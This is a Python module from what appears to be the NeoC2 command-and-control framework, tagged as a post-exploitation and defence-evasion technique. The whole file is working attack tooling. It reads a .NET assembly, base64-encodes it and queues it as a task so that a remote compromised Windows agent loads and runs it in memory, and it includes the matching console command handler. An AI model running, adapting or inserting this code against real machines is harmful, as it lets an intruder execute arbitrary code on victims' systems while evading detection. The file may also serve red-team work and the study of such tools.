import os
import base64
from pathlib import Path

def get_info():
    return {
        "name": "inline-assembly",
        "description": "Load and execute .NET assemblies in-memory on agents",
        "type": "post-exploitation",
        "platform": "windows",
        "author": "NeoC2 Framework by @stillbigjosh",
        "references": [
            "https://learn.microsoft.com/en-us/dotnet/core/deploying/single-file/overview",
            ".NET in-memory assembly execution techniques"
        ],
        "technique_id": "T1055,T1620",
        "mitre_tactics": ["Execution", "Defense Evasion"],
        "options": {
            "agent_id": {
                "description": "ID of the agent to execute the .NET assembly on",
                "required": True
            },
            "assembly_path": {
                "description": "Path to the .NET assembly file to execute",
                "required": True
            }
        }
    }


def execute(options, session):
    agent_id = options.get("agent_id")
    assembly_path = options.get("assembly_path")

    if not agent_id:
        return {
            "success": False,
            "error": "agent_id is required"
        }

    if not assembly_path:
        return {
            "success": False,
            "error": "assembly_path is required"
        }

    if not hasattr(session, 'agent_manager') or session.agent_manager is None:
        return {
            "success": False,
            "error": "Session does not have an initialized agent_manager"
        }

    try:
        agent_manager = session.agent_manager

        agent = agent_manager.get_agent(agent_id)
        if not agent:
            return {
                "success": False,
                "error": f"Agent {agent_id} not found"
            }

        if os.path.isabs(assembly_path) and os.path.exists(assembly_path):
            assembly_full_path = assembly_path
        else:
            possible_paths = [
                assembly_path,
                os.path.join(os.getcwd(), assembly_path),
                os.path.join(os.path.dirname(__file__), 'external', os.path.basename(assembly_path)),
                os.path.join(os.path.dirname(__file__), 'external', 'assemblies', os.path.basename(assembly_path)),
                os.path.join(os.path.dirname(__file__), '..', 'external', os.path.basename(assembly_path)),
                os.path.join(os.path.dirname(__file__), '..', 'external', 'assemblies', os.path.basename(assembly_path)),
            ]

            found = False
            for path in possible_paths:
                if os.path.exists(path):
                    assembly_full_path = path
                    found = True
                    break

            if not found:
                assembly_dirs = [
                    os.path.join(os.path.dirname(__file__), 'external', 'assemblies'),
                    os.path.join(os.path.dirname(__file__), 'external'),
                    os.path.join(os.path.dirname(__file__), '..', 'external', 'assemblies'),
                    os.path.join(os.path.dirname(__file__), '..', 'external')
                ]

                available_files = []
                for asm_dir in assembly_dirs:
                    if os.path.exists(asm_dir):
                        available_files.extend([f for f in os.listdir(asm_dir) if f.lower().endswith(('.exe', '.dll'))])

                return {
                    "success": False,
                    "error": f"Assembly file does not exist: {assembly_path}. Searched in common locations. Available assembly files: {available_files if available_files else ['No files found']}"
                }

        with open(assembly_full_path, 'rb') as f:
            assembly_content = f.read()

        encoded_assembly = base64.b64encode(assembly_content).decode('utf-8')

        assembly_command = f"assembly {encoded_assembly}"

        if hasattr(session, 'is_interactive_execution') and session.is_interactive_execution:
            result = {
                "success": True,
                "output": f"[x] .NET assembly execution prepared for interactive mode",
                "command": assembly_command,
                "assembly_path": assembly_full_path,
                "encoded_assembly_size": len(encoded_assembly)
            }

            session.audit_logger = getattr(session, 'audit_logger', None)
            if session.audit_logger:
                session.audit_logger.log_event(
                    user_id=getattr(session, 'user_id', 'unknown'),
                    action='dotnet_assembly_execute',
                    resource_type='task',
                    resource_id='interactive',
                    details=f".NET assembly execution prepared for interactive mode. Command: assembly <base64_data> ({len(encoded_assembly)} chars encoded)",
                    ip_address='127.0.0.1'
                )

            return result
        else:
            task_id = agent_manager.add_task(agent_id, assembly_command)
            if task_id:
                result = {
                    "success": True,
                    "output": f"[x] .NET assembly execution task queued for agent {agent_id}",
                    "task_id": task_id,
                    "assembly_command": assembly_command,
                    "assembly_path": assembly_full_path,
                    "encoded_assembly_size": len(encoded_assembly)
                }

                session.audit_logger = getattr(session, 'audit_logger', None)
                if session.audit_logger:
                    session.audit_logger.log_event(
                        user_id=getattr(session, 'user_id', 'unknown'),
                        action='dotnet_assembly_execute',
                        resource_type='task',
                        resource_id=task_id,
                        details=f".NET assembly execution queued for agent {agent_id}. Command: assembly <base64_data> ({len(encoded_assembly)} chars encoded)",
                        ip_address='127.0.0.1'
                    )

                return result
            else:
                return {
                    "success": False,
                    "error": f"Failed to queue .NET assembly execution task for agent {agent_id}"
                }

    except Exception as e:
        return {
            "success": False,
            "error": f"Error executing .NET assembly: {str(e)}"
        }


def _handle_assembly_command(command_parts, session):
    try:
        if len(command_parts) < 3:
            return "Usage: assembly <agent_id> <assembly_path>", 'error'

        agent_id = command_parts[1]
        assembly_path = command_parts[2]

        agent_manager = session.agent_manager
        if not agent_manager:
            return "Agent manager not initialized", 'error'

        agent = agent_manager.get_agent(agent_id)
        if not agent:
            return f"Agent {agent_id} not found", 'error'

        options = {
            'agent_id': agent_id,
            'assembly_path': assembly_path,
        }

        module_manager = session.module_manager
        if not module_manager:
            return "Module manager not initialized", 'error'

        loaded_modules_dict = getattr(module_manager, 'loaded_modules', {})

        assembly_module = None
        if 'inline-assembly' in loaded_modules_dict:
            assembly_module = loaded_modules_dict['inline-assembly']['module']
        else:
            module_path = os.path.join('modules', 'inline-assembly.py')
            load_success = module_manager.load_module(module_path)
            if load_success or 'inline-assembly' in loaded_modules_dict:
                if 'inline-assembly' in loaded_modules_dict:
                    assembly_module = loaded_modules_dict['inline-assembly']['module']

        if assembly_module and hasattr(assembly_module, 'execute'):
            result = assembly_module.execute(options, session)
            if 'success' in result and result['success']:
                return result.get('output', '.NET assembly execution task queued successfully'), 'success'
            else:
                return result.get('error', 'Unknown error occurred during .NET assembly execution'), 'error'
        else:
            return "Could not load inline-assembly module from modules/inline-assembly.py", 'error'

    except Exception as e:
        return f"Error handling assembly command: {str(e)}", 'error'